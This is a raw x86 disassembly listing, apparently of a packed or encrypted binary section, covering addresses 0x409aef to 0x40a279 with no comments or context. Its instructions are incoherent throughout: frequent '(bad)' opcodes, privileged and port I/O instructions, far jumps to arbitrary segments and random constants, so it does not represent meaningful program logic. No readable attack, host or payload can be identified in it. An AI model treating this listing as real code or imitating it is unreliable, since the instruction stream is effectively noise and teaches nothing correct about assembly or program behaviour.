  409aef:	mov    ebp,0x835e6dd7
  409af4:	rcl    BYTE PTR [ebx-0x6a],cl
  409af7:	mov    esi,0x241c9f6d
  409afc:	jno    0x409adc
  409afe:	sahf   
  409aff:	es xchg ebx,ebx
  409b02:	jp     0x409b43
  409b04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b05:	mov    bl,0x1e
  409b07:	(bad)  
  409b08:	(bad)  
  409b09:	in     al,dx
  409b0a:	jmp    0x8606:0x8ca3d163
  409b11:	sub    DWORD PTR [edx-0xd513767],edx
  409b17:	xor    ebp,DWORD PTR [esi+0x3d]
  409b1a:	adc    eax,0x697baf7
  409b1f:	in     eax,0x4d
  409b21:	adc    DWORD PTR [ebx+ecx*1-0x7d],0x68
  409b26:	push   cs
  409b27:	popa   
  409b28:	lahf   
  409b29:	daa    
  409b2a:	or     al,0x61
  409b2c:	outs   dx,BYTE PTR ds:[esi]
  409b2d:	imul   ecx,esp,0x4a
  409b30:	call   0x1f56:0xdb0432f2
  409b37:	(bad)  
  409b38:	out    dx,al
  409b39:	dec    edx
  409b3a:	aas    
  409b3b:	or     ecx,DWORD PTR [edx+ebp*2+0x5]
  409b3f:	add    edx,DWORD PTR [esi-0xd]
  409b42:	idiv   DWORD PTR [ebx+0x50]
  409b45:	fbld   TBYTE PTR [esp+ebx*4+0x5b]
  409b49:	retf   
  409b4a:	and    dh,BYTE PTR [ebp-0x6f]
  409b4d:	xor    edx,esi
  409b4f:	cwde   
  409b50:	cld    
  409b51:	mov    dh,0xd9
  409b53:	and    eax,0x85eadcfb
  409b58:	dec    ecx
  409b59:	xchg   ebx,eax
  409b5a:	int    0xde
  409b5c:	je     0x409ae9
  409b5e:	or     DWORD PTR [esi+0x7818c324],eax
  409b64:	sbb    al,0x28
  409b66:	leave  
  409b67:	popa   
  409b68:	push   es
  409b69:	dec    esi
  409b6a:	fcos   
  409b6c:	sub    DWORD PTR [ebx],ecx
  409b6e:	ds sub al,0x4
  409b71:	lea    ebp,[edi+ecx*2+0x1c]
  409b75:	and    BYTE PTR [edi],bh
  409b77:	lea    edx,[esi+eiz*1-0x48c6e9f]
  409b7e:	or     edi,DWORD PTR [ecx]
  409b80:	xor    eax,0x3c028154
  409b85:	nop
  409b86:	hlt    
  409b87:	inc    ecx
  409b88:	scas   al,BYTE PTR es:[edi]
  409b89:	das    
  409b8a:	repnz lahf 
  409b8c:	xor    al,0x14
  409b8e:	popa   
  409b8f:	cli    
  409b90:	icebp  
  409b91:	mov    edi,0x6472e793
  409b96:	push   cs
  409b97:	push   esp
  409b98:	fldcw  WORD PTR [edi+esi*8-0x213b8512]
  409b9f:	or     eax,0x4f4b13c3
  409ba4:	sub    esi,DWORD PTR [eax-0x22]
  409ba7:	(bad)  
  409ba8:	mov    ds:0xe7a5b439,al
  409bad:	mov    dl,0x59
  409baf:	(bad)  
  409bb0:	xchg   ebp,eax
  409bb1:	in     al,0xf5
  409bb3:	icebp  
  409bb4:	push   ebp
  409bb5:	jg     0x409b88
  409bb7:	or     esi,DWORD PTR [esi-0x65]
  409bba:	cli    
  409bbb:	je     0x409b64
  409bbd:	lods   al,BYTE PTR ds:[esi]
  409bbe:	rol    DWORD PTR [eax+edx*2],1
  409bc1:	mov    ch,0xbf
  409bc3:	cmp    al,0x56
  409bc5:	cmp    esp,DWORD PTR [ecx-0x27e44e90]
  409bcb:	jge    0x409baf
  409bcd:	shr    ebx,1
  409bcf:	std    
  409bd0:	mov    ebx,0x612b9efc
  409bd5:	imul   esp,esp,0x49257718
  409bdb:	adc    eax,0x86b7a06f
  409be0:	sub    DWORD PTR [edx-0x67808a1c],esp
  409be6:	mov    edi,0x18dc8325
  409beb:	stc    
  409bec:	lods   al,BYTE PTR ds:[esi]
  409bed:	or     dl,bl
  409bef:	imul   eax,edx,0x7d4d1f38
  409bf5:	dec    edx
  409bf6:	mov    bh,dl
  409bf8:	ja     0x409bf9
  409bfa:	retf   0xa0b5
  409bfd:	jbe    0x409bf1
  409bff:	aad    0x39
  409c01:	imul   edx,DWORD PTR [edx-0x2f21904e],0xfffffff2
  409c08:	cmp    DWORD PTR [ebp+0x5b4cfd26],0x54
  409c0f:	and    DWORD PTR [edx],edx
  409c11:	mov    ecx,DWORD PTR [ebp+0x12b003b6]
  409c17:	dec    edi
  409c18:	pop    ebx
  409c19:	sbb    edi,ebp
  409c1b:	mov    ebx,ebx
  409c1d:	jns    0x409bef
  409c1f:	push   ds
  409c20:	inc    esp
  409c21:	test   bh,ah
  409c23:	dec    edi
  409c24:	scas   al,BYTE PTR es:[edi]
  409c25:	rcr    DWORD PTR ds:[ebx],0xee
  409c29:	jb     0x409caa
  409c2b:	cmp    dl,dl
  409c2d:	retf   0xf6a5
  409c30:	xlat   BYTE PTR ds:[ebx]
  409c31:	les    esp,FWORD PTR [edx-0x31]
  409c34:	(bad)  
  409c35:	sar    DWORD PTR [ecx+0x4f],0xe5
  409c39:	push   0x7c42174
  409c3e:	sahf   
  409c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c40:	leave  
  409c41:	push   edx
  409c42:	jne    0x409c6b
  409c44:	sub    edx,DWORD PTR [ecx+0x19f0fb7b]
  409c4a:	jp     0x409bd0
  409c4c:	sar    al,0x3f
  409c4f:	cwde   
  409c50:	jl     0x409cd0
  409c52:	sbb    cl,BYTE PTR [esi-0x61]
  409c55:	fldenv [edi-0x57]
  409c58:	mov    ah,0x16
  409c5a:	pop    es
  409c5b:	pop    es
  409c5c:	mov    ah,0xad
  409c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c5f:	sbb    eax,edx
  409c61:	pushf  
  409c62:	retf   0xd67f
  409c65:	dec    esi
  409c66:	inc    ebx
  409c67:	pop    eax
  409c68:	cmp    ebx,DWORD PTR [eax-0x6f76abef]
  409c6e:	pop    eax
  409c6f:	inc    esi
  409c70:	pause  
  409c72:	cmp    eax,DWORD PTR es:[edx-0x9d54ded]
  409c79:	xor    eax,0xf6f84cbc
  409c7e:	sar    DWORD PTR [edx+eax*8+0x70],0x68
  409c83:	push   ebp
  409c84:	adc    al,0x76
  409c86:	call   0x782f8667
  409c8b:	mov    edi,0xfffcfe5a
  409c90:	adc    DWORD PTR [edi-0x2e],ebp
  409c93:	xor    DWORD PTR [bp+0x347b],eax
  409c98:	popf   
  409c99:	cmc    
  409c9a:	sbb    bl,BYTE PTR [eax-0x57]
  409c9d:	retf   0xe4be
  409ca0:	ds repz sti 
  409ca3:	inc    eax
  409ca4:	std    
  409ca5:	mov    ecx,0xb06ed0d3
  409caa:	inc    edx
  409cab:	out    0x56,al
  409cad:	push   ecx
  409cae:	xor    ah,cl
  409cb0:	xor    dh,BYTE PTR [esi]
  409cb2:	inc    eax
  409cb3:	xchg   edi,eax
  409cb4:	lock pop ebx
  409cb6:	pop    ebx
  409cb7:	ds xor al,0x5e
  409cba:	(bad)  
  409cbc:	daa    
  409cbd:	fild   WORD PTR [ebx+eax*8-0x22829533]
  409cc4:	imul   ebp,esi,0xffffffdc
  409cc7:	ins    DWORD PTR es:[edi],dx
  409cc8:	in     eax,0xe5
  409cca:	loop   0x409ce6
  409ccc:	xor    bl,BYTE PTR [ecx]
  409cce:	inc    ebx
  409ccf:	leave  
  409cd0:	or     eax,0xf52215c1
  409cd5:	sub    BYTE PTR [eax-0xdffdefd],bh
  409cdb:	or     eax,0xf769dd57
  409ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ce1:	test   ebx,ebp
  409ce3:	mov    ah,0xc5
  409ce5:	push   ecx
  409ce6:	sbb    eax,eax
  409ce8:	jl     0x409d32
  409cea:	fwait
  409ceb:	mov    WORD PTR [esi+0x6c8c37c6],?
  409cf1:	(bad)  
  409cf2:	and    al,0x1d
  409cf4:	mov    ds,edi
  409cf6:	mov    al,0xc4
  409cf8:	pop    esi
  409cf9:	outs   dx,BYTE PTR ds:[esi]
  409cfa:	je     0x409d0a
  409cfc:	rcr    BYTE PTR [ebp+0x4f0150ea],0x29
  409d03:	mov    ds:0xf96fff95,eax
  409d08:	aam    0x3f
  409d0a:	pop    ds
  409d0b:	push   esi
  409d0c:	clc    
  409d0d:	dec    edi
  409d0e:	add    ebx,ebp
  409d10:	stos   DWORD PTR es:[edi],eax
  409d11:	dec    eax
  409d12:	mov    al,0x8f
  409d14:	(bad)  
  409d15:	jne    0x409cfd
  409d17:	or     eax,0x4bd8b81d
  409d1c:	(bad)  
  409d1e:	cmp    si,bx
  409d21:	pusha  
  409d22:	or     esi,DWORD PTR [edx+0x1c3d1562]
  409d28:	in     al,0x50
  409d2a:	cdq    
  409d2b:	cli    
  409d2c:	inc    eax
  409d2d:	fmul   DWORD PTR [esi+0x14]
  409d30:	(bad)  
  409d32:	jle    0x409cf1
  409d34:	(bad)  
  409d35:	outs   dx,BYTE PTR ds:[esi]
  409d36:	test   DWORD PTR [edi],esi
  409d38:	push   edi
  409d39:	test   al,0x5d
  409d3b:	sti    
  409d3c:	leave  
  409d3d:	mov    cl,0x3
  409d3f:	add    BYTE PTR [ebx+0x4d7ba466],ch
  409d45:	pop    ebx
  409d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d47:	loopne 0x409dbe
  409d49:	mov    ah,0x1e
  409d4b:	inc    eax
  409d4c:	je     0x409d9b
  409d4e:	lock push 0x209016b5
  409d54:	xchg   esp,eax
  409d55:	cmp    DWORD PTR [eax-0x46101734],esi
  409d5b:	dec    ebx
  409d5c:	repz push ebx
  409d5e:	mov    ebp,0x151dedd1
  409d63:	retf   0x9d9e
  409d66:	sub    al,BYTE PTR [eax+0x7f8a7aa8]
  409d6c:	ja     0x409cf3
  409d6e:	and    edi,0xcae4f0be
  409d74:	bound  esi,QWORD PTR ds:0xec30605
  409d7a:	jmp    0xef38583d
  409d7f:	(bad)  
  409d80:	fldenv [edi*4-0x2cc8a341]
  409d87:	cld    
  409d88:	bnd ret 0xdcbc
  409d8c:	mov    al,ds:0xb67226c8
  409d91:	xor    BYTE PTR [edx-0x7211a9b7],ch
  409d97:	mov    eax,0x910d6632
  409d9c:	mov    eax,ds:0x1c047fd5
  409da1:	cmp    DWORD PTR [esi+ebp*8-0x4c82cfd6],ebp
  409da8:	ins    BYTE PTR es:[edi],dx
  409da9:	cmp    ecx,DWORD PTR [edx-0x2b]
  409dac:	jmp    0xf4feaf11
  409db1:	mov    esi,0xc63049ad
  409db6:	je     0x409d40
  409db8:	repnz mov ebx,0x4f73bc8a
  409dbe:	loop   0x409d59
  409dc0:	js     0x409e0b
  409dc2:	ror    BYTE PTR [ebx-0x61ea2175],1
  409dc8:	adc    al,0x4b
  409dca:	pop    ecx
  409dcb:	mov    al,ds:0x6a92b6cf
  409dd0:	aas    
  409dd1:	sahf   
  409dd2:	fwait
  409dd3:	stos   DWORD PTR es:[edi],eax
  409dd4:	pop    edi
  409dd5:	popf   
  409dd6:	ins    BYTE PTR es:[edi],dx
  409dd7:	retf   
  409dd8:	xchg   DWORD PTR [esp+ebp*2],eax
  409ddb:	inc    ebp
  409ddc:	(bad)  
  409ddd:	in     al,0x58
  409ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409de0:	outs   dx,DWORD PTR ds:[esi]
  409de1:	add    BYTE PTR [esi+ebx*4+0x56e516b4],0x67
  409de9:	std    
  409dea:	push   edx
  409deb:	xchg   edi,eax
  409dec:	aad    0xa3
  409dee:	stc    
  409def:	xchg   BYTE PTR [edx],dh
  409df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409df2:	mov    ds:0x1794ac33,al
  409df7:	jge    0x409e03
  409df9:	enter  0x8c24,0x9e
  409dfd:	aad    0x3f
  409dff:	retf   0x8dde
  409e02:	pop    ebx
  409e03:	int    0x16
  409e05:	imul   BYTE PTR [ebx+0x225ac026]
  409e0b:	mov    bh,dl
  409e0d:	pushf  
  409e0e:	lds    edi,FWORD PTR [edi+eiz*1]
  409e11:	clc    
  409e12:	into   
  409e13:	mov    bl,BYTE PTR [edx+0x5c]
  409e16:	xchg   esp,eax
  409e17:	jns    0x409e09
  409e19:	outs   dx,BYTE PTR ds:[esi]
  409e1a:	dec    ebp
  409e1b:	iret   
  409e1c:	pop    eax
  409e1d:	(bad)  
  409e1e:	in     eax,0x9d
  409e20:	xor    bl,BYTE PTR [ecx+0x1f]
  409e23:	fcmovu st,st(7)
  409e25:	fisttp DWORD PTR [esi+0x30]
  409e28:	int3   
  409e29:	mov    eax,0x3c535618
  409e2e:	std    
  409e2f:	push   ebp
  409e30:	push   es
  409e31:	fwait
  409e32:	mov    esp,0xf2ee32b9
  409e37:	daa    
  409e38:	stos   DWORD PTR es:[edi],eax
  409e39:	(bad)  
  409e3a:	bound  esp,QWORD PTR [eax+0x7d005979]
  409e40:	sbb    BYTE PTR [edi],dl
  409e42:	sub    eax,0x57484f7
  409e47:	jo     0x409e3d
  409e49:	push   esp
  409e4a:	adc    ecx,DWORD PTR [edx+0x662f1f36]
  409e50:	enter  0xe77b,0x3e
  409e54:	cmp    bh,BYTE PTR [ecx]
  409e56:	pop    esi
  409e57:	adc    ebx,DWORD PTR [esi+0x74f05655]
  409e5d:	xchg   ebp,eax
  409e5e:	push   esi
  409e5f:	std    
  409e60:	retf   0x307b
  409e63:	shr    DWORD PTR [esp+edi*4],cl
  409e66:	mov    esp,DWORD PTR [esi-0x459c9c57]
  409e6c:	lahf   
  409e6d:	int    0x4a
  409e6f:	mov    ch,0x5a
  409e71:	jnp    0x409e7f
  409e73:	dec    edx
  409e74:	mov    WORD PTR [ebp+ebp*2-0x46],ss
  409e78:	mov    eax,ds:0xa8c0ee1
  409e7d:	out    0xb9,eax
  409e7f:	and    dh,BYTE PTR [ebp+0x25]
  409e82:	or     cl,bh
  409e84:	fld    TBYTE PTR [ebp+0x4f4e9a40]
  409e8a:	inc    eax
  409e8b:	cld    
  409e8c:	sahf   
  409e8d:	push   edx
  409e8e:	and    BYTE PTR [esi+0x6],ah
  409e91:	rsm    
  409e93:	push   ds
  409e94:	(bad)  
  409e96:	adc    DWORD PTR [ebx+0x0],edi
  409e99:	and    BYTE PTR [esi],ch
  409e9b:	add    BYTE PTR [eax],dh
  409e9d:	mov    dh,0x21
  409e9f:	sbb    dh,BYTE PTR [esi-0x22]
  409ea2:	fcomp  QWORD PTR ss:[ebp-0x6aa29938]
  409ea9:	mov    DWORD PTR [edi+0x7d],0xbda9fe79
  409eb0:	ss xchg edi,eax
  409eb2:	fs loop 0x409f34
  409eb5:	pop    ebx
  409eb6:	dec    edx
  409eb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eb8:	daa    
  409eb9:	out    0xf0,eax
  409ebb:	adc    al,0x6
  409ebd:	mov    BYTE PTR [ebx],dh
  409ebf:	cmp    BYTE PTR fs:[ebp-0x6f066684],bl
  409ec6:	jmp    0x9d4e:0xe146167f
  409ecd:	jle    0x409f17
  409ecf:	push   ebp
  409ed0:	sub    al,al
  409ed2:	or     BYTE PTR [edi+0x6515a205],ch
  409ed8:	dec    eax
  409ed9:	in     al,dx
  409eda:	(bad)  
  409edb:	jnp    0x409eb2
  409edd:	fwait
  409ede:	xchg   edx,eax
  409edf:	adc    BYTE PTR [eax+edx*8+0x32],al
  409ee3:	pop    esp
  409ee4:	call   0xf8a21def
  409ee9:	fcmovnbe st,st(2)
  409eeb:	imul   edi,DWORD PTR [eax+0x7ce5da0c],0x66
  409ef2:	xchg   edi,eax
  409ef3:	cdq    
  409ef4:	pop    ds
  409ef5:	push   edx
  409ef6:	(bad)  
  409ef8:	outs   dx,BYTE PTR ds:[esi]
  409ef9:	mov    ah,0xeb
  409efb:	mov    eax,ds:0xfd8b0cf1
  409f00:	jne    0x409f38
  409f02:	sbb    DWORD PTR [esi+0x2965562d],esi
  409f08:	or     cl,BYTE PTR [eax]
  409f0a:	hlt    
  409f0b:	shr    BYTE PTR [esi+0x3ed654b2],1
  409f11:	pop    es
  409f12:	rol    DWORD PTR [ecx-0x58],cl
  409f15:	adc    eax,0xacac539
  409f1a:	mov    dh,0x4d
  409f1c:	aas    
  409f1d:	mov    dl,0x4a
  409f1f:	push   0x6205596d
  409f24:	xlat   BYTE PTR ds:[ebx]
  409f25:	jns    0x409f95
  409f27:	fsubrp st(5),st
  409f29:	aad    0x51
  409f2b:	dec    edx
  409f2c:	psubusb mm7,QWORD PTR [ebp+0x61760f2d]
  409f33:	mul    DWORD PTR [edx-0x77]
  409f36:	jbe    0x409f58
  409f38:	pop    edx
  409f39:	push   DWORD PTR [ecx-0x1cbff3ce]
  409f3f:	xor    al,BYTE PTR [ebx]
  409f41:	fisub  DWORD PTR [eax]
  409f43:	nop
  409f44:	mov    DWORD PTR [eax-0x38cb29c0],ecx
  409f4a:	sub    BYTE PTR [edx],bh
  409f4c:	mov    ch,0x99
  409f4e:	stos   BYTE PTR es:[edi],al
  409f4f:	jmp    0x409f6c
  409f51:	inc    ecx
  409f52:	stos   DWORD PTR es:[edi],eax
  409f53:	out    dx,al
  409f54:	cwde   
  409f55:	or     BYTE PTR [ebp+0x2c],ah
  409f58:	mov    ebx,0x30700d20
  409f5d:	mov    ds:0xd6d1c88d,al
  409f62:	xchg   esp,eax
  409f63:	sti    
  409f64:	mov    DWORD PTR [esi],edx
  409f66:	nop
  409f67:	push   esp
  409f68:	inc    ecx
  409f69:	idiv   DWORD PTR [ebx]
  409f6b:	sbb    eax,0x50f6fb57
  409f70:	es xchg ecx,eax
  409f72:	inc    eax
  409f73:	repz fcom QWORD PTR [edx-0x54e494a3]
  409f7a:	aas    
  409f7b:	inc    esp
  409f7c:	test   al,ch
  409f7e:	shl    BYTE PTR [ecx-0x311a42c5],1
  409f84:	cmp    al,0xe1
  409f86:	push   ss
  409f87:	jns    0x409ff2
  409f89:	push   ds
  409f8a:	jg     0x409ff7
  409f8c:	dec    esi
  409f8d:	data16 aam 0x4f
  409f90:	sub    BYTE PTR [ecx-0x5addbe4b],0x9d
  409f97:	in     al,dx
  409f98:	push   ebx
  409f99:	pop    eax
  409f9a:	xor    al,0xd5
  409f9c:	cmp    al,BYTE PTR [eax+0x79a43361]
  409fa2:	mov    al,0xd5
  409fa4:	(bad)  
  409fa5:	jne    0x409f47
  409fa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fa8:	fwait
  409fa9:	xchg   ebp,eax
  409faa:	das    
  409fab:	adc    ebp,DWORD PTR [ebp-0x491e7007]
  409fb1:	adc    al,0xcf
  409fb3:	xor    bx,bx
  409fb6:	aas    
  409fb7:	inc    esp
  409fb8:	adc    eax,0xc03787f7
  409fbd:	outs   dx,BYTE PTR ds:[esi]
  409fbe:	cwd    
  409fc0:	in     al,dx
  409fc1:	cmc    
  409fc2:	loopne 0x40a03d
  409fc4:	ret    0x1916
  409fc7:	out    0x3b,al
  409fc9:	test   al,0xda
  409fcb:	mov    ah,0x9a
  409fcd:	xchg   ebx,eax
  409fce:	out    dx,al
  409fcf:	cmc    
  409fd0:	sahf   
  409fd1:	ins    DWORD PTR es:[edi],dx
  409fd2:	test   eax,0x2f34652b
  409fd7:	push   cs
  409fd8:	lock xchg esi,eax
  409fda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fdb:	sub    bh,BYTE PTR gs:[esi]
  409fde:	sub    ah,BYTE PTR [eax]
  409fe0:	fsub   DWORD PTR [edx]
  409fe2:	inc    ebx
  409fe3:	jns    0x40a05c
  409fe5:	je     0x409f7f
  409fe7:	int    0xf0
  409fe9:	mov    dh,0xcc
  409feb:	inc    esp
  409fec:	sti    
  409fed:	xchg   ebp,eax
  409fee:	es cmc 
  409ff0:	(bad)  
  409ff1:	push   ecx
  409ff2:	cmp    eax,0x865940bc
  409ff7:	imul   esp,esi,0x6d
  409ffa:	lods   eax,DWORD PTR ds:[esi]
  409ffb:	adc    ah,BYTE PTR [esi+0x7]
  409ffe:	inc    edi
  409fff:	(bad)  
  40a000:	cld    
  40a001:	xor    eax,0xd8c98f0f
  40a006:	sbb    dl,BYTE PTR [edi-0x1d]
  40a009:	imul   di,WORD PTR [edx-0xb212e44],0x64
  40a011:	and    edi,DWORD PTR [edx-0x137ed7ad]
  40a017:	cmp    bl,dh
  40a019:	sub    DWORD PTR [ebx+ecx*8],esi
  40a01c:	int3   
  40a01d:	cmp    bh,BYTE PTR [ebx+0x49]
  40a020:	xchg   edi,eax
  40a021:	fst    QWORD PTR [edi]
  40a023:	lock cvttps2pi mm1,xmm6
  40a027:	popa   
  40a028:	imul   esi,DWORD PTR [esi+0x63],0x8a6b57d0
  40a02f:	jg     0x40a09a
  40a031:	dec    esp
  40a032:	pop    ecx
  40a033:	add    DWORD PTR [ebx+0x3e],esp
  40a036:	cmp    al,0xf9
  40a038:	popf   
  40a039:	shr    BYTE PTR [edi-0x67],cl
  40a03c:	mov    bl,0x27
  40a03e:	jmp    0x95f9e66f
  40a043:	icebp  
  40a044:	ret    0x9e3e
  40a047:	retf   
  40a048:	mov    edi,0xed296278
  40a04d:	mov    ebp,0x84a1abd1
  40a052:	ds int 0xb0
  40a055:	pop    ecx
  40a056:	out    dx,al
  40a057:	cmp    eax,0xe7c72034
  40a05c:	or     bl,BYTE PTR [ebp-0x56414a6e]
  40a062:	std    
  40a063:	jge    0x40a03a
  40a065:	int    0xd6
  40a067:	mov    cl,0xf2
  40a069:	mov    cl,0x2b
  40a06b:	into   
  40a06c:	mov    edx,0x6db052c9
  40a071:	aad    0x10
  40a073:	pop    edi
  40a074:	cmp    ebx,ecx
  40a076:	xchg   edi,eax
  40a077:	js     0x40a006
  40a079:	in     eax,dx
  40a07a:	xchg   edx,eax
  40a07b:	stc    
  40a07c:	jp     0x40a0ca
  40a07e:	mov    ds:0x3994ce6b,eax
  40a083:	xchg   esp,eax
  40a084:	out    dx,al
  40a085:	(bad)  [eax]
  40a087:	pop    es
  40a088:	pop    eax
  40a089:	dec    ebx
  40a08a:	js     0x40a075
  40a08c:	sbb    al,0x3d
  40a08e:	cmp    esi,edx
  40a090:	and    BYTE PTR [ebx],cl
  40a092:	fadd   DWORD PTR [esi+0x77eccd41]
  40a098:	pop    ebp
  40a099:	and    al,0x66
  40a09b:	inc    edi
  40a09c:	pop    ebp
  40a09d:	ficom  WORD PTR [esi-0x64]
  40a0a0:	dec    eax
  40a0a1:	xor    bh,BYTE PTR [ecx]
  40a0a3:	aad    0xe7
  40a0a5:	ins    BYTE PTR es:[edi],dx
  40a0a6:	adc    DWORD PTR [ebx+0x45],0x6e143ac5
  40a0ad:	mov    al,0x8e
  40a0af:	mov    cl,BYTE PTR [ebp+0x6d4fa74f]
  40a0b5:	ret    
  40a0b6:	fwait
  40a0b7:	inc    edx
  40a0b8:	adc    eax,0xd1cb3c43
  40a0bd:	sbb    eax,DWORD PTR [ecx]
  40a0bf:	fs push 0xffffffa9
  40a0c2:	loopne 0x40a064
  40a0c4:	test   eax,0x9e154210
  40a0c9:	fidiv  DWORD PTR [ecx+0x56a75fac]
  40a0cf:	adc    esp,DWORD PTR [edx+0x7bf6a986]
  40a0d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0d6:	mov    eax,ds:0xb8d48dfa
  40a0db:	mov    edx,esp
  40a0dd:	inc    ebp
  40a0de:	dec    eax
  40a0df:	rcl    DWORD PTR [ebp+eiz*1-0x58c11ba8],1
  40a0e6:	test   al,0x8c
  40a0e8:	add    cl,BYTE PTR [edi]
  40a0ea:	fild   WORD PTR [edx+0x6c83a026]
  40a0f0:	pop    DWORD PTR [ecx-0x5f244173]
  40a0f6:	sub    eax,0x16f624fa
  40a0fb:	repz push ecx
  40a0fd:	repnz cli 
  40a0ff:	sub    cl,BYTE PTR [esi-0x24]
  40a102:	fidiv  WORD PTR [esi-0x39429b86]
  40a108:	cmp    BYTE PTR [esi+0x74f07f2a],0xb8
  40a10f:	(bad)  
  40a110:	lahf   
  40a111:	add    cl,BYTE PTR [ebx+0x6b680f16]
  40a117:	inc    ecx
  40a118:	jle    0x40a09b
  40a11a:	inc    ebp
  40a11b:	ss sbb bl,al
  40a11e:	inc    ebp
  40a11f:	outs   dx,BYTE PTR ds:[esi]
  40a120:	std    
  40a121:	pop    ss
  40a122:	sti    
  40a123:	outs   dx,BYTE PTR ds:[esi]
  40a124:	xor    dl,BYTE PTR [ecx+0x5f9682a]
  40a12a:	mov    gs,WORD PTR [ebx]
  40a12c:	cmp    eax,0x3616df0b
  40a131:	jmp    0xf813:0x38175cef
  40a138:	cs dec ebx
  40a13a:	rcr    BYTE PTR [ebx-0x4dae61a2],cl
  40a140:	xchg   ebp,eax
  40a141:	pop    edx
  40a142:	mul    BYTE PTR [esi-0x32024a28]
  40a148:	inc    edi
  40a149:	dec    esp
  40a14a:	mov    ebp,0x4a9d3c4b
  40a14f:	retf   0x61b5
  40a152:	loopne 0x40a1b0
  40a154:	push   edi
  40a155:	loope  0x40a119
  40a157:	pop    eax
  40a158:	sub    al,0x19
  40a15a:	shr    DWORD PTR [edi-0x2d],0x88
  40a15e:	inc    ecx
  40a160:	jge    0x40a185
  40a162:	mov    DWORD PTR [esi-0x5f],esi
  40a165:	inc    esp
  40a166:	(bad)  
  40a167:	push   esp
  40a168:	adc    DWORD PTR [ecx],edx
  40a16a:	inc    esi
  40a16b:	fcmovb st,st(6)
  40a16d:	xchg   DWORD PTR [esi],ebp
  40a16f:	bswap  ebp
  40a171:	mov    bl,0x9d
  40a173:	jmp    0x485:0x872fdb90
  40a17a:	(bad)  
  40a17c:	dec    ebx
  40a17d:	fcom   DWORD PTR [eax+0xc02f1d5]
  40a183:	mov    dh,0x38
  40a185:	loopne 0x40a1e1
  40a187:	out    dx,al
  40a188:	ss push ds
  40a18a:	aad    0xe
  40a18c:	pop    gs
  40a18e:	inc    esp
  40a18f:	mov    WORD PTR [eax],gs
  40a191:	push   ds
  40a192:	daa    
  40a193:	(bad)  
  40a194:	and    eax,0x8dcd7a20
  40a199:	sub    eax,0x7f51a22d
  40a19e:	fsubr  DWORD PTR [ecx+ecx*4+0x39]
  40a1a2:	ror    BYTE PTR [ecx+0x7d],cl
  40a1a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1a6:	sub    edi,DWORD PTR [ebx]
  40a1a8:	sub    al,BYTE PTR [esi-0x3]
  40a1ab:	jge    0x40a1af
  40a1ad:	loop   0x40a148
  40a1af:	cwde   
  40a1b0:	addr16 xor al,0xb6
  40a1b3:	xchg   ebx,eax
  40a1b4:	gs test ah,ah
  40a1b7:	and    edx,esp
  40a1b9:	sub    al,0x75
  40a1bb:	mov    ebx,0x544a90a6
  40a1c0:	push   ecx
  40a1c1:	xchg   edi,eax
  40a1c2:	(bad)  
  40a1c3:	out    0x2d,eax
  40a1c5:	loope  0x40a22b
  40a1c7:	mov    bh,0x15
  40a1c9:	adc    edx,esi
  40a1cb:	dec    BYTE PTR [ecx]
  40a1cd:	mov    bh,BYTE PTR [edx+0x5d]
  40a1d0:	pop    ebx
  40a1d1:	inc    ecx
  40a1d2:	dec    BYTE PTR [edi+0x67]
  40a1d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1d6:	outs   dx,BYTE PTR ds:[esi]
  40a1d7:	cmc    
  40a1d8:	jb     0x40a1ac
  40a1da:	jecxz  0x40a1e1
  40a1dc:	(bad)  
  40a1dd:	xchg   ebp,eax
  40a1de:	mov    ebp,0x12208ef2
  40a1e3:	jle    0x40a1de
  40a1e5:	imul   ebx,DWORD PTR [ebp+0x69],0xffffffc5
  40a1e9:	fwait
  40a1ea:	mov    dl,BYTE PTR [ecx]
  40a1ec:	outs   dx,DWORD PTR ds:[esi]
  40a1ed:	jne    0x40a1aa
  40a1ef:	sbb    eax,0x5c74e42a
  40a1f4:	and    DWORD PTR [edx+0x67f15a38],esp
  40a1fa:	lods   eax,DWORD PTR ds:[esi]
  40a1fb:	inc    eax
  40a1fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1fd:	adc    eax,0x29eaec2d
  40a202:	mov    ebx,0x874ddfc7
  40a207:	div    DWORD PTR [ecx]
  40a209:	mov    ecx,0x32c8409b
  40a20e:	and    DWORD PTR [ebx-0x3a],esi
  40a211:	je     0x40a260
  40a213:	int3   
  40a214:	xor    BYTE PTR [eax],bh
  40a216:	sbb    eax,0x6c9f0c3a
  40a21b:	push   0xa3a011ce
  40a220:	dec    ecx
  40a221:	jle    0x40a23a
  40a223:	fadd   DWORD PTR [esi-0x14183ea4]
  40a229:	jle    0x40a267
  40a22b:	loop   0x40a258
  40a22d:	nop
  40a22e:	or     DWORD PTR [ecx+ebx*8-0x5f2d496b],eax
  40a235:	pop    ss
  40a236:	dec    eax
  40a237:	aaa    
  40a238:	les    edi,FWORD PTR [ebp-0x24c47ad]
  40a23e:	mov    eax,DWORD PTR [edi+0x1dcd2616]
  40a244:	adc    edx,edx
  40a246:	mov    esp,DWORD PTR [edx-0x56f98aa4]
  40a24c:	xchg   edx,eax
  40a24d:	xchg   esp,eax
  40a24e:	pop    edx
  40a24f:	pop    edx
  40a250:	mov    edi,?
  40a252:	xor    al,0x64
  40a254:	fwait
  40a255:	sbb    al,0xcc
  40a257:	inc    ebp
  40a258:	xor    ebp,DWORD PTR [edi+0x16224590]
  40a25e:	mov    ah,0xbd
  40a260:	sub    dl,bh
  40a262:	(bad)  
  40a264:	sbb    DWORD PTR [ebp-0x55cbed6d],0x67
  40a26b:	pop    ebp
  40a26c:	in     eax,dx
  40a26d:	pop    esi
  40a26e:	fwait
  40a26f:	pop    edx
  40a270:	mov    dl,0x9f
  40a272:	rol    DWORD PTR [edi],1
  40a274:	jmp    0xbc0fe0f8
  40a279:	sahf   
